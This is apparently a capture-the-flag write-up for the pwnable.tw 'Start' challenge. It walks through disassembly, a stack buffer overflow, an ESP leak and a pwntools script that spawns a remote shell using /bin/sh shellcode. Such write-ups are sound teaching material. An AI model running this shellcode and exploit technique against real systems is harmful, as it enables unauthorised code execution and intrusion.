---
name: Pwnable_Start
tools: [Pwnable, Binary Exploitation]
image: https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/pwnable/pwnable.png
description:  A 100-point challenge from Pwnable.tw
---

<b>Link: </b><span style="color:#007bff">https://pwnable.tw/challenge/#1</span>

<b>Points</b>: 100

<b>Write-up by:</b><span style="color:#007bff"> https://github.com/heckintosh </span>

A typical buffer overflow attack with a little twist. For these first few challenges, I like to write in details so that I (and the readers) can remember the basic and fundamentals well.

## <u>1. Initial Analysis</u>
First we get the type of the file.
```sh
$ file start                                   
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```
So it's a 32-bit Little-endian ELF. So pop the binary into your Linux machine to analyze. Remember to chmod the binary:
```sh
$ chmod +x ./start
```
Open the binary in pwndbg:
```sh
$ gdb -q ./start
pwndbg> checksec
[*] '/home/dan09/CTF/Pwnable/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found               // No memory protection in this binary.
    NX:       NX disabled
    PIE:      No PIE (0x8048000)      

pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x08048060  _start
0x0804809d  _exit
0x080490a3  __bss_start
0x080490a3  _edata
0x080490a4  _end  
```

## <u id="assembly-analysis">2. Assembly Analysis</u>
```sh
pwndbg> start
pwndbg> disass
```
```yaml
Dump of assembler code for function _start:
0x08048060 <+0>:     push   esp                     // ESP is pushed to the stack
0x08048061 <+1>:     push   0x804809d               // Push the address of exit func
0x08048066 <+6>:     xor    eax,eax                 // Zero out the register
0x08048068 <+8>:     xor    ebx,ebx
0x0804806a <+10>:    xor    ecx,ecx
0x0804806c <+12>:    xor    edx,edx
0x0804806e <+14>:    push   0x3a465443              // PUSH CTF
0x08048073 <+19>:    push   0x20656874              // PUSH ('the ')
0x08048078 <+24>:    push   0x20747261              // PUSH ('art ')
0x0804807d <+29>:    push   0x74732073              // PUSH ('s st')
0x08048082 <+34>:    push   0x2774654c              // PUSH ("Let'")
0x08048087 <+39>:    mov    ecx,esp                 // Ecx contains the char pointer to the string one wants to print. In this case it is the ESP.
0x08048089 <+41>:    mov    dl,0x14                 // dl (edx) contains the size of the char array ones want to print. 0x14 = 20 bytes just enough for the string
0x0804808b <+43>:    mov    bl,0x1                  // bl (ebx) defines file descriptor. 1 means STDOUT
0x0804808d <+45>:    mov    al,0x4                  // al (eax) defines what type of syscall we want to make. 4 means write
0x0804808f <+47>:    int    0x80                    // 0x80 is a syscall. Same stuff below
0x08048091 <+49>:    xor    ebx,ebx                 // fd = 0 ==> STDIN
0x08048093 <+51>:    mov    dl,0x3c                 // Read up to 60 bytes from user input.
0x08048095 <+53>:    mov    al,0x3                  // 3 means read.
0x08048097 <+55>:    int    0x80                    // syscall, the missing ecx is taken from the above, which means user input will be written to the stack.
0x08048099 <+57>:    add    esp,0x14                // clean stack
0x0804809c <+60>:    ret 
```

Understand the code and you can move on to the next step.


## <u>3. Exploitation</u>

### <i>3.1 Locating the buffer</i>
In order to overflow the buffer, we have to know where it is. As you can see the syscall write has ecx denoting the start of the buffer. The size of the buffer is 20 bytes.

[Add image here]

Let's focus on these instructions, which is where you can give input:


```yaml
0x08048091 <+49>:    xor    ebx,ebx         // fd = 0 ==> STDIN
0x08048093 <+51>:    mov    dl,0x3c         // Read up to 60 bytes from user input.
0x08048095 <+53>:    mov    al,0x3          // 3 means read.
0x08048097 <+55>:    int    0x80            // syscall, the missing ecx is taken from the above, which means user input will be written to the stack.
```

So whatever you input will overwrite the stack defined by the instructions before. I inputed test and you can see what happens to the stack below. 

```ps
──────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ ecx esp 0xffffce04 ◂— 0x74736574 ('test')
01:0004│         0xffffce08 ◂— 0x7473200a ('\n st')
02:0008│         0xffffce0c ◂— 0x20747261 ('art ')
03:000c│         0xffffce10 ◂— 0x20656874 ('the ')
04:0010│         0xffffce14 ◂— 0x3a465443 ('CTF:')
05:0014│         0xffffce18 —▸ 0x804809d (_exit) ◂— pop    esp
06:0018│         0xffffce1c —▸ 0xffffce20 ◂— 0x1
07:001c│         0xffffce20 ◂— 0x1
```

The following instructions clean ups 20 bytes the stack, essentially leaves the ret at 0xffffce18 —▸ 0x804809d (_exit) ◂— pop    esp
```yaml
0x08048099 <+57>:    add    esp,0x14                // clean stack
0x0804809c <+60>:    ret 
```

So our mission is to overflow the 0xffffce18 address (the _exit function) and it will return to whatever address we want. We have a padding of 20 bytes and 4 bytes payload to overwrite the address.

### <i>3.2 Overwrite the return address</i>
So what do we overwrite the return address with? The payload can't be simply AAAAAAAAAAAAAAAAAAAA + buffer address since it will just jump to a bunch of As. We can do something like this:

```
  AAAAA...AAAAAAA        +       overwrite address       +            nop sled                   +      shellcode
────────────────────           ────────────────────             ────────────────────
         ▼                              ▼                                 ▼
  20 As of padding              Address of NOP sled          \x90\x90\x90 (dont use too much nop or the sled will 
                                                                  overflow too much and weird things will 
                                                                  overwrite the sled on the stack)
```

Just search for shellcode on Google and get the 28 bytes one.
```ps
\x31\xc0\x50\x68\x2f\x2f\x73
\x68\x68\x2f\x62\x69\x6e\x89
\xe3\x89\xc1\x89\xc2\xb0\x0b
\xcd\x80\x31\xc0\x40\xcd\x80
```

Here is the payload

```ps
AAAAAAAAAAAAAAAAAAAA[4 bytes of the address containing nop sled]\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

We still have to figure out the address of the NOP sled. On our local machine it's easy to just inspect the stack and find where the \x90\x90\x90\x90 lands. Use the command below for submitting input automatically.

```yaml
pwndbg> r < <(echo -ne "AAAAAAAAAAAAAAAAAAAABBBB\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")
Starting program: /home/dan09/CTF/Pwnable/start < <(echo -ne "AAAAAAAAAAAAAAAAAAAABBBB\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")
Let's start the CTF:
```

Inspecting the stack after injecting the above we can see the nop sled lies at 0xffffce2c. 

```yaml
pwndbg> telescope 40 $esp
00:0000│ ecx esp 0xffffce14 ◂— 0x41414141 ('AAAA')
... ↓            4 skipped
05:0014│         0xffffce28 ◂— 0x42424242 ('BBBB')
06:0018│         0xffffce2c ◂— 0x90909090
07:001c│         0xffffce30 ◂— 0xc0319090
08:0020│         0xffffce34 ◂— 0x2f2f6850 ('Ph//')
09:0024│         0xffffce38 ◂— 0x2f686873 ('shh/')
0a:0028│         0xffffce3c ◂— 0x896e6962
0b:002c│         0xffffce40 ◂— 0x89c189e3
0c:0030│         0xffffce44 ◂— 0xcd0bb0c2
0d:0034│         0xffffce48 ◂— 0x40c03180
```

Change the payload and starts injecting, we can then have a shell:

```yaml   
pwndbg> r < <(echo -ne "AAAAAAAAAAAAAAAAAAAA\x2c\xce\xff\xff\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x8\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")
Starting program: /home/dan09/CTF/Pwnable/start < <(echo -ne "AAAAAAAAAAAAAAAAAAAA\x2c\xce\xff\xff\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xc\x80")
Let's start the CTF:process 3058 is executing new program: /usr/bin/dash
[Inferior 1 (process 3058) exited normally]
```

### <i>3.3 Sounds good, doesn't work</i >
All that work but we still have no clue regarding the nop sled address on the server. 

At this stage, we can't even exploit the binary running locally since the address we got from the above is altered now (<i>there is no pwndbg elements on the stack</i>). More info [here.](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it)
```sh
$ echo -ne "AAAAAAAAAAAAAAAAAAAA\x2c\xce\xff\xff\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xc\x80" | ./start
Lets start the CTF:zsh: done                echo -ne  | 
zsh: segmentation fault  ./start
```

Note: if you want the exploit to work the same in pwndbg (gdb) and normal execution, you have to take care of [environment variables](https://russtone.io/2016/07/31/test-exploits-under-gdb/). Here we are trying to exploit the binary remotely, who knows what they have on their server and the stack would be unpredictable so we have to take a different approach instead of hardcoding the shellcode (or nop sled) address (even with nop sled, which we cannot overabuse, it is still painful to find out the right address).

### <i>3.4 Leaking the esp address</i>
Scroll above and you can see when we run the checksec command, the PIE has no PIE. A No PIE (Position Independent Executable) binary tells the loader which virtual address it should use (and keeps its memory layout quite static). Hence, attacks against this application know up-front how the virtual memory for this application is (partially) organized. 

That means the instruction addresses in our local binary is the same as in the remote server. Look at the [instruction](#assembly-analysis) again. The below instruction clears the stack after the main functionality of the program is done.

```yaml
0x08048099 <+57>:    add    esp,0x14                // clean the <Let's start the CTF> in the stack)
0x0804809c <+60>:    ret                            // pop the exit function
```

We can overflow the ret with <span style="color:#007bff">0x08048087</span> which is the address of the instruction `mov ecx,esp`. `ecx` is an argument to the syscall write. Since the stack has been cleared and the exit instruction has been overwritten, now on the stack there is only the address of esp left. And esp will be pointing there. The `mov ecx, esp` instruction therefore puts the address of esp into ecx, making the syscall writes the esp address to the screen.

```yaml
0x08048087 <+39>:    mov    ecx,esp
0x08048089 <+41>:    mov    dl,0x14
0x0804808b <+43>:    mov    bl,0x1
0x0804808d <+45>:    mov    al,0x4
0x0804808f <+47>:    int    0x80
```

### <i>3.5 Actually exploiting the binary remotely</i>
What is the point of knowing the esp address? Well, now we can add 20 more bytes to that address and got ourselves the address of our shellcode (without NOP). 
So the final payload (after leaking the esp address):

```
  AAAAA...AAAAAAA        +     esp +20 (since esp is before 20A)           +      shellcode
────────────────────           ──────────────────────────────────             
         ▼                              ▼                                 
  20 As of padding              Address of shellcode          
```

Now we write the final exploit code: 

```python
from pwn import *
pads = 'A'*0x14
esp_leak_payload = pads + p32(0x08048087)
p = remote('chall.pwnable.tw',10000)
p.recvuntil(':')
p.send(esp_leak_payload)
tmp = p.recv()
esp = u32(tmp[:4])
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
final_payload = b'A'*20 + p32(esp+20) + shellcode
p.send(final_payload)
p.interactive()
```

And we got the shell!

```sh
[+] Opening connection to chall.pwnable.tw on port 10000: Done
/home/dan09/CTF/Pwnable/start.py:5: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil(':')
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ 
```